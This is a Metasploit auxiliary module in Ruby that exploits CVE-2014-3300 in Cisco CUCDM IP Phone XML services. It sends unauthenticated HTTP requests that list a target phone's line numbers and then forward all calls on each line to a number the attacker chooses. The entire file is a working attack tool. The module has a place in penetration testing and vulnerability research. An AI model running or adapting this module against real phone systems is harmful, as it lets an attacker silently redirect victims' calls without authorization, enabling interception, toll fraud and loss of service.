##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rexml/document'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
        'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
        'Version'     => '1',
        'Description' => %q{
          CUCDM IP Phone XML Services - Call Forwarding Tool
          This tool can be tested with the voss-xmlservice component of Viproy.
          https://github.com/fozavci/viproy-voipkit/raw/master/external/voss-xmlservice.rb
        },
        'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
        'References'     =>
            [
                ['CVE', 'CVE-2014-3300'],
                ['BID', '68331'],
            ],
        'License'     => MSF_LICENSE
    )

    register_options(
        [
            Opt::RPORT(80),
            OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
            OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
            OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
            OptString.new('ACTION', [ true, 'Call forwarding action (FORWARD,INFO)', 'FORWARD']),
            OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines', '']),
        ], self.class)
  end

  def run
    uri = normalize_uri(target_uri.to_s)
    mac = Rex::Text.uri_encode(datastore["MAC"])
    forwardto = Rex::Text.uri_encode(datastore["FORWARDTO"])


    print_status("Getting fintnumbers and display names of the IP phone")

    uri_show=uri+"/showcallfwd.cgi?device=SEP#{mac}"
    vprint_status("URL: "+uri_show)

    res = send_request_cgi(
      {
        'uri'    => uri_show,
        'method' => 'GET',
      }, 20)

    if (res and res.code == 200 and res.body =~ /fintnumber/)
      doc = REXML::Document.new(res.body)
      lines=[]
      fintnumbers=[]

      list=doc.root.get_elements("MenuItem")
      list.each {|lst|
        xlist=lst.get_elements("Name")
        xlist.each {|l| lines << "#{l[0]}"}
        xlist=lst.get_elements("URL")
        xlist.each {|l| fintnumbers << "#{l[0].to_s.split("fintnumber=")[1]}" }
      }
      lines.size.times{|i| print_status("Display Name: "+lines[i]+"\t"+"Fintnumber: "+fintnumbers[i])}


      if datastore["ACTION"] == "FORWARD"
        fintnumbers.each {|fintnumber|

        print_status("Sending call forward request for #{fintnumber}")

        uri_fwd=uri+"/phonecallfwd.cgi?cfoption=CallForwardAll&device=SEP#{mac}&ProviderName=NULL&fintnumber=#{fintnumber}&telno1=#{forwardto}"
        vprint_status("URL: "+uri_fwd)
        res = send_request_cgi(
            {
                'uri'    => uri_fwd,
                'method' => 'GET',
            }, 20)

        uri_fwdpln=uri+"/showcallfwdperline.cgi?device=SEP#{mac}&fintnumber=#{fintnumber}"
        vprint_status("URL: "+uri_fwdpln)
        res = send_request_cgi(
            {
                'uri'    => uri_fwdpln,
                'method' => 'GET',
            }, 20)

        if (res.body.to_s =~ /CFA/)
          print_good("Call forwarded successfully for #{fintnumber}")
        else
          print_status("Call forward failed.")
        end
        }
      end
    else
      print_error("Target appears not vulnerable!")
    end
  end
end
